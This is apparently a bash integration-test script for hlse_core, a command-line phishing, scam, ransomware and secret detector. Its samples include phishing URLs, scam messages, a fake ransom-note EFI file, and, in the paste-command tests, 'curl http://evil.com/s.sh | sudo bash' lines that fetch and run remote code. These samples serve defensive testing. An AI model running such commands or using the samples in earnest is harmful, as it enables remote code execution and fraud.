#!/bin/bash
# tests/cli_integration.sh
#
# End-to-end CLI integration tests for hlse_core.
# Verifies exit codes, stdout/stderr separation, and JSON parseability.

set -eu

PASS=0
FAIL=0

check() {
    local name="$1"
    local expected="$2"
    local actual="$3"

    if [ "$expected" = "$actual" ]; then
        echo "PASS  $name"
        PASS=$((PASS + 1))
    else
        echo "FAIL  $name"
        echo "      expected: $expected"
        echo "      actual:   $actual"
        FAIL=$((FAIL + 1))
    fi
}

cd "$(dirname "$0")/.."
[ -x ./hlse_core ] || { echo "Build hlse_core first: make"; exit 2; }

# ─── exit codes ─────────────────────────────────────────────────────────

# Safe URL → exit 0
./hlse_core "https://github.com" >/dev/null 2>&1
check "Safe URL exits 0" "0" "$?"

# Malicious URL (BLOCK score) → exit 1
./hlse_core "https://paypal.com.attacker.xyz/verify" >/dev/null 2>&1 \
    && rc=0 || rc=$?
check "Malicious URL exits 1" "1" "$rc"

# Safe text → exit 0
./hlse_core text "Meeting tomorrow" >/dev/null 2>&1
check "Safe text exits 0" "0" "$?"

# Scam text (BLOCK) → exit 1
./hlse_core text "Microsoft Support: your PC has a virus, send gift cards now URGENT" \
    >/dev/null 2>&1 && rc=0 || rc=$?
# Allow either 0 or 1 since score might be ALERT (0) or BLOCK (1)
case "$rc" in
    0|1) PASS=$((PASS + 1)); echo "PASS  Scam text exit code valid ($rc)" ;;
    *)   FAIL=$((FAIL + 1)); echo "FAIL  Scam text bad exit code ($rc)" ;;
esac

# Help flag
./hlse_core --help >/dev/null 2>/tmp/hlse_help_err
[ -s /tmp/hlse_help_err ] && PASS=$((PASS + 1)) \
    && echo "PASS  --help writes to stderr" \
    || { FAIL=$((FAIL + 1)); echo "FAIL  --help should write to stderr"; }

# ─── JSON output ────────────────────────────────────────────────────────

# JSON parseability via Python
JSON_OUT=$(./hlse_core --json "https://g00gle.com")
echo "$JSON_OUT" | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "url"
assert data["score"] >= 40
assert "reasons" in data and len(data["reasons"]) > 0
' && check "JSON URL output parseable" "0" "0" \
   || check "JSON URL output parseable" "0" "1"

JSON_OUT=$(./hlse_core --json text "URGENT wire 5000")
echo "$JSON_OUT" | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "text"
assert data["score"] >= 30
' && check "JSON text output parseable" "0" "0" \
   || check "JSON text output parseable" "0" "1"

# ─── stdin pipe ─────────────────────────────────────────────────────────

# Mixed stdin input
STDIN_OUT=$(printf '%s\n' "https://g00gle.com" "https://github.com" \
            "URGENT wire money" "Meeting tomorrow" \
            | ./hlse_core --stdin)

echo "$STDIN_OUT" | grep -q "ALERT.*g00gle" \
    && check "stdin: detects malicious URL" "0" "0" \
    || check "stdin: detects malicious URL" "0" "1"

echo "$STDIN_OUT" | grep -q "OK.*github" \
    && check "stdin: passes legit URL" "0" "0" \
    || check "stdin: passes legit URL" "0" "1"

# ─── self-test integration ──────────────────────────────────────────────

./hlse_core --self-test 2>&1 | grep -qE "[0-9]+ passed, 0 failed" \
    && check "self-test URL all pass" "0" "0" \
    || check "self-test URL all pass" "0" "1"

./hlse_core --self-test 2>&1 | grep -qE "Text tests: [0-9]+ passed, 0 failed" \
    && check "self-test text all pass" "0" "0" \
    || check "self-test text all pass" "0" "1"

# ─── benchmark integration ──────────────────────────────────────────────

./hlse_core --benchmark 2>&1 | grep -q "F1:        1.000" \
    && check "benchmark F1=1.000" "0" "0" \
    || check "benchmark F1=1.000" "0" "1"

# ─── Apple-style features ──────────────────────────────────────────────

# No-arg demo: should print live demo and exit 0
./hlse_core 2>&1 | grep -q "phishing & scam detection" \
    && check "no-arg demo shows product intro" "0" "0" \
    || check "no-arg demo shows product intro" "0" "1"

# --version
./hlse_core --version 2>&1 | grep -qE "hlse_core [0-9]+\.[0-9]+\.[0-9]+" \
    && check "--version shows semver" "0" "0" \
    || check "--version shows semver" "0" "1"

# Empty string → error (not OK)
./hlse_core "" 2>&1 | grep -q "Nothing to scan" \
    && check "empty input → meaningful error" "0" "0" \
    || check "empty input → meaningful error" "0" "1"

# Unified scan: text without 'text' subcommand
./hlse_core "URGENT wire 5000 immediately gift card" 2>&1 | grep -qE "ALERT|BLOCK|LOG|ISOLATE" \
    && check "auto-detect text (no 'text' subcommand needed)" "0" "0" \
    || check "auto-detect text (no 'text' subcommand needed)" "0" "1"

# ─── protect subcommand ─────────────────────────────────────────────

# protect on /tmp (clean) → should exit 0
./hlse_core protect /tmp >/dev/null 2>&1
check "protect /tmp exits 0 (clean)" "0" "$?"

# protect with ransom note
PROT_DIR=$(mktemp -d)
echo "Your files encrypted" > "$PROT_DIR/HOW_TO_DECRYPT.txt"
./hlse_core protect "$PROT_DIR" 2>&1 | grep -qE "R3|Ransom" \
    && check "protect detects ransom note" "0" "0" \
    || check "protect detects ransom note" "0" "1"

# JSON protect output
JSON_PROT=$(./hlse_core --json protect "$PROT_DIR" 2>&1)
echo "$JSON_PROT" | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "protect"
assert data["score"] >= 30
assert "reasons" in data
' && check "--json protect parseable" "0" "0" \
   || check "--json protect parseable" "0" "1"

rm -rf "$PROT_DIR"

# ─── esp subcommand (UEFI/ESP integrity) ────────────────────────────

# Clean ESP (benign .efi, no ransom text) → exit 0
ESP_DIR=$(mktemp -d)
mkdir -p "$ESP_DIR/EFI/BOOT"
head -c 4096 /dev/urandom > "$ESP_DIR/EFI/BOOT/BOOTX64.EFI"
./hlse_core esp "$ESP_DIR" >/dev/null 2>&1
check "esp: clean ESP exits 0" "0" "$?"

# Malicious .efi carrying a ransom-note phrase → BLOCK (exit 1)
printf 'MZ payload all your files have been encrypted pay bitcoin' \
    > "$ESP_DIR/EFI/BOOT/evil.efi"
./hlse_core esp "$ESP_DIR" 2>&1 | grep -qE "E3|encrypted" \
    && check "esp: detects ransom string in .efi" "0" "0" \
    || check "esp: detects ransom string in .efi" "0" "1"
./hlse_core esp "$ESP_DIR" >/dev/null 2>&1 && rc=0 || rc=$?
check "esp: malicious ESP exits 1" "1" "$rc"

# Non-.efi file with the same text must NOT be scanned (extension filter)
ESP_DIR2=$(mktemp -d); mkdir -p "$ESP_DIR2/EFI"
printf 'all your files have been encrypted pay bitcoin' > "$ESP_DIR2/EFI/notes.txt"
./hlse_core esp "$ESP_DIR2" >/dev/null 2>&1
check "esp: ignores non-.efi files" "0" "$?"

# Missing ESP path → graceful exit 0
./hlse_core esp "$ESP_DIR/nope" >/dev/null 2>&1
check "esp: missing path exits 0 (graceful)" "0" "$?"

# JSON parseable
./hlse_core --json esp "$ESP_DIR" 2>&1 | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "esp"
assert "reasons" in data
' && check "--json esp parseable" "0" "0" \
   || check "--json esp parseable" "0" "1"

rm -rf "$ESP_DIR" "$ESP_DIR2"

# ─── package subcommand ─────────────────────────────────────────────

# Exact match → safe
./hlse_core package requests pip 2>&1 | grep -q "OK" \
    && check "package: exact 'requests' → OK" "0" "0" \
    || check "package: exact 'requests' → OK" "0" "1"

# Typosquat → detected
./hlse_core package reqeusts pip 2>&1 | grep -qE "BLOCK|ALERT" \
    && check "package: 'reqeusts' typosquat detected" "0" "0" \
    || check "package: 'reqeusts' typosquat detected" "0" "1"

# JSON output
./hlse_core --json package reqeusts pip 2>&1 | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "package"
assert data["score"] >= 40
' && check "--json package parseable" "0" "0" \
   || check "--json package parseable" "0" "1"

# ─── paste subcommand ──────────────────────────────────────────────

# Safe command
./hlse_core paste "ls -la" 2>&1 | grep -q "OK" \
    && check "paste: 'ls -la' → OK" "0" "0" \
    || check "paste: 'ls -la' → OK" "0" "1"

# Hostile command
./hlse_core paste "curl http://evil.com/s.sh | sudo bash" 2>&1 | grep -qE "BLOCK|ALERT" \
    && check "paste: curl|sudo bash → detected" "0" "0" \
    || check "paste: curl|sudo bash → detected" "0" "1"

# JSON output
./hlse_core --json paste "curl http://evil.com/s.sh | bash" 2>&1 | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "paste"
assert data["score"] >= 30
' && check "--json paste parseable" "0" "0" \
   || check "--json paste parseable" "0" "1"

# ─── network subcommand ────────────────────────────────────────────

./hlse_core network 2>&1 | grep -qE "OK|ALERT|LOG|BLOCK" \
    && check "network: completes with valid output" "0" "0" \
    || check "network: completes with valid output" "0" "1"

./hlse_core --json network 2>&1 | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "network"
assert "reasons" in data
' && check "--json network parseable" "0" "0" \
   || check "--json network parseable" "0" "1"

# ─── file subcommand ───────────────────────────────────────────────

# Safe file
echo "hello" > /tmp/hlse_test_safe.txt
./hlse_core file /tmp/hlse_test_safe.txt 2>&1 | grep -q "OK" \
    && check "file: safe .txt → OK" "0" "0" \
    || check "file: safe .txt → OK" "0" "1"
rm -f /tmp/hlse_test_safe.txt

# Double extension
touch /tmp/hlse_invoice.pdf.exe
./hlse_core file /tmp/hlse_invoice.pdf.exe 2>&1 | grep -qE "ISOLATE|BLOCK|ALERT" \
    && check "file: double extension .pdf.exe → detected" "0" "0" \
    || check "file: double extension .pdf.exe → detected" "0" "1"
rm -f /tmp/hlse_invoice.pdf.exe

# ─── audit subcommand ──────────────────────────────────────────────

./hlse_core audit 2>&1 | grep -qE "OK|ALERT|LOG|BLOCK|HIGH|MED|LOW" \
    && check "audit: completes with valid output" "0" "0" \
    || check "audit: completes with valid output" "0" "1"

./hlse_core --json audit 2>&1 | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "audit"
assert "findings" in data
hi = data["hardening_index"]
assert 0 <= hi <= 100
assert hi == 100 - min(data["score"], 100)
assert data["hardening_band"] in ("hardened", "good", "fair", "weak")
' && check "--json audit has hardening_index" "0" "0" \
   || check "--json audit has hardening_index" "0" "1"

# Human-readable output shows the hardening index
./hlse_core audit 2>&1 | grep -q "Hardening index:" \
    && check "audit: prints hardening index" "0" "0" \
    || check "audit: prints hardening index" "0" "1"

# ─── compound detection ────────────────────────────────────────────

# Embedded phishing URL in urgency text → compound score
./hlse_core "URGENT: click https://g00gle.com/signin now" 2>&1 | grep -qE "BLOCK|ISOLATE" \
    && check "embedded phishing URL + urgency → compound BLOCK+" "0" "0" \
    || check "embedded phishing URL + urgency → compound BLOCK+" "0" "1"

# ─── scan subcommand ────────────────────────────────────────────

# Scan clean directory
SCAN_DIR=$(mktemp -d)
echo "safe content" > "$SCAN_DIR/readme.txt"
./hlse_core scan "$SCAN_DIR" 2>&1 | grep -q "0 threats" \
    && check "scan: clean dir → 0 threats" "0" "0" \
    || check "scan: clean dir → 0 threats" "0" "1"

# Scan with secret
echo "AKIAIOSFODNN7EXAMPLE" > "$SCAN_DIR/config.env"
./hlse_core scan "$SCAN_DIR" 2>&1 | grep -qE "AWS|threat" \
    && check "scan: detects leaked AWS key" "0" "0" \
    || check "scan: detects leaked AWS key" "0" "1"

# Scan with double extension
touch "$SCAN_DIR/invoice.pdf.exe"
./hlse_core --json scan "$SCAN_DIR" 2>&1 | python3 -c '
import sys, json
lines = [l.strip() for l in sys.stdin if l.strip()]
assert len(lines) >= 1, "no output"
# All lines must be valid JSON
for l in lines:
    json.loads(l)
# Last line must be scan_summary
summary = json.loads(lines[-1])
assert summary["kind"] == "scan_summary", f"last line is {summary['kind']}"
assert "files_scanned" in summary
assert "threats" in summary
' && check "--json scan with summary line" "0" "0" \
   || check "--json scan with summary line" "0" "1"

# Scan detects phishing URLs in files
echo 'Visit https://g00gle.com/signin now' > "$SCAN_DIR/phish.md"
./hlse_core scan "$SCAN_DIR" 2>&1 | grep -qE "g00gle|BLOCK|ALERT" \
    && check "scan: detects phishing URL in file" "0" "0" \
    || check "scan: detects phishing URL in file" "0" "1"

rm -rf "$SCAN_DIR"

# ─── quiet mode ────────────────────────────────────────────────

# Quiet: no output, exit 0 for safe
OUT=$(./hlse_core -q "https://github.com" 2>&1)
RC=$?
[ -z "$OUT" ] && [ "$RC" = "0" ] \
    && check "quiet: safe URL → no output, exit 0" "0" "0" \
    || check "quiet: safe URL → no output, exit 0" "0" "1"

# Quiet: no output, exit 1 for threat
OUT=$(./hlse_core -q "https://paypal.com.attacker.xyz/verify" 2>&1 || true)
RC_QUIET=$?
# When || true catches it, $? is 0 — need to test differently
./hlse_core -q "https://paypal.com.attacker.xyz/verify" > /tmp/hlse_q_out 2>&1 || RC_QUIET=$?
Q_OUTPUT=$(cat /tmp/hlse_q_out 2>/dev/null)
rm -f /tmp/hlse_q_out
[ -z "$Q_OUTPUT" ] \
    && check "quiet: threat URL → no output, exit non-zero" "0" "0" \
    || check "quiet: threat URL → no output, exit non-zero" "0" "1"

# ─── scan skip + embedded URL ───────────────────────────────────────

# Scan skips node_modules by default
SKIP_DIR=$(mktemp -d)
mkdir -p "$SKIP_DIR/node_modules/pkg"
echo "AKIAIOSFODNN7EXAMPLE" > "$SKIP_DIR/node_modules/pkg/key.js"
echo "safe content" > "$SKIP_DIR/app.js"
./hlse_core scan "$SKIP_DIR" 2>&1 | grep -q "0 threats" \
    && check "scan: skips node_modules" "0" "0" \
    || check "scan: skips node_modules" "0" "1"
rm -rf "$SKIP_DIR"

# Scan nonexistent directory → error exit 2
./hlse_core scan /tmp/hlse_does_not_exist_dir 2>&1 | grep -q "Error" \
    && check "scan: nonexistent dir → error message" "0" "0" \
    || check "scan: nonexistent dir → error message" "0" "1"

./hlse_core scan /tmp/hlse_does_not_exist_dir > /dev/null 2>&1 || rc=$?
[ "${rc:-0}" -eq 2 ] \
    && check "scan: nonexistent dir → exit 2" "0" "0" \
    || check "scan: nonexistent dir → exit 2" "0" "1"

# Text with embedded phishing URL
./hlse_core text "Click here: https://g00gle.com/signin" 2>&1 | grep -qE "ALERT|BLOCK|ISOLATE" \
    && check "text: embedded phishing URL detected" "0" "0" \
    || check "text: embedded phishing URL detected" "0" "1"

# ─── error handling for nonexistent paths ──────────────────────────

./hlse_core scan /tmp/hlse_nonexistent_$$ 2>&1 | grep -q "cannot access" \
    && check "scan: nonexistent path → error message" "0" "0" \
    || check "scan: nonexistent path → error message" "0" "1"

./hlse_core protect /tmp/hlse_nonexistent_$$ 2>&1 | grep -q "cannot access" \
    && check "protect: nonexistent path → error message" "0" "0" \
    || check "protect: nonexistent path → error message" "0" "1"

# A nonexistent path is now analyzed by NAME (catches RLO/double-ext on
# files not present locally). A plain .txt name should come back clean.
./hlse_core file /tmp/hlse_nonexistent_$$.txt >/dev/null 2>&1 \
    && check "file: nonexistent plain name → clean (name analysis)" "0" "0" \
    || check "file: nonexistent plain name → clean (name analysis)" "0" "1"

# A nonexistent RLO-disguised name must still be flagged by name analysis.
RLO_NAME=$(printf 'invoice\342\200\256cod.exe')
./hlse_core file "$RLO_NAME" 2>&1 | grep -qE "OVERRIDE|ISOLATE|BLOCK" \
    && check "file: RLO name flagged even when file absent" "0" "0" \
    || check "file: RLO name flagged even when file absent" "0" "1"

# ─── URL evasion resistance ────────────────────────────────────────

# URL-encoded path: %76%65%72%69%66%79 = /verify
./hlse_core "https://g00gle.com/%76%65%72%69%66%79" 2>&1 | grep -q "verify" \
    && check "URL: percent-encoded path decoded (%76%65.. → verify)" "0" "0" \
    || check "URL: percent-encoded path decoded" "0" "1"

# IP-based phishing: brand in path of IP URL
./hlse_core "https://198.51.100.1/paypal/signin" 2>&1 | grep -qE "ALERT|BLOCK|IP-based" \
    && check "URL: IP host + brand in path → detected" "0" "0" \
    || check "URL: IP host + brand in path → detected" "0" "1"

# ─── SARIF 2.1.0 output ─────────────────────────────────────────────

# SARIF output is valid JSON with version 2.1.0
SARIF_DIR=$(mktemp -d)
echo "key = AKIA2E3MWORQXYZ4567PQ" > "$SARIF_DIR/secrets.env"
touch "$SARIF_DIR/invoice.pdf.exe"
./hlse_core --sarif scan "$SARIF_DIR" 2>/dev/null | grep -q '"version": "2.1.0"' \
    && check "SARIF: emits version 2.1.0" "0" "0" \
    || check "SARIF: emits version 2.1.0" "0" "1"

./hlse_core --sarif scan "$SARIF_DIR" 2>/dev/null | grep -q '"name": "HLSE"' \
    && check "SARIF: tool driver name HLSE" "0" "0" \
    || check "SARIF: tool driver name HLSE" "0" "1"

./hlse_core --sarif scan "$SARIF_DIR" 2>/dev/null | grep -q '"ruleId": "secret"' \
    && check "SARIF: secret result present" "0" "0" \
    || check "SARIF: secret result present" "0" "1"

./hlse_core --sarif scan "$SARIF_DIR" 2>/dev/null | grep -q '"security-severity"' \
    && check "SARIF: security-severity property present" "0" "0" \
    || check "SARIF: security-severity property present" "0" "1"

# SARIF parses as valid JSON via python (if available)
if command -v python3 >/dev/null 2>&1; then
    ./hlse_core --sarif scan "$SARIF_DIR" 2>/dev/null | \
        python3 -c "import json,sys; json.load(sys.stdin)" 2>/dev/null \
        && check "SARIF: valid parseable JSON" "0" "0" \
        || check "SARIF: valid parseable JSON" "0" "1"
fi
rm -rf "$SARIF_DIR"

# ─── JSON control-char escaping ─────────────────────────────────────
# A secret file containing a control byte must still produce valid JSON
# (the \uXXXX escape path).
if command -v python3 >/dev/null 2>&1; then
    JE_DIR=$(mktemp -d)
    printf 'secret\x01ctrl = AKIA2E3MWORQXYZ4567PQ\n' > "$JE_DIR/c.env"
    ./hlse_core --json scan "$JE_DIR" 2>/dev/null | \
        python3 -c "import json,sys; [json.loads(l) for l in sys.stdin if l.strip()]" 2>/dev/null \
        && check "JSON: control char → valid \\uXXXX escape" "0" "0" \
        || check "JSON: control char → valid \\uXXXX escape" "0" "1"
    rm -rf "$JE_DIR"
fi

# ─── results ────────────────────────────────────────────────────────────

echo ""
echo "═════════════════════════════════"
echo "  CLI Integration: $PASS passed, $FAIL failed"
echo "═════════════════════════════════"

[ "$FAIL" -eq 0 ]
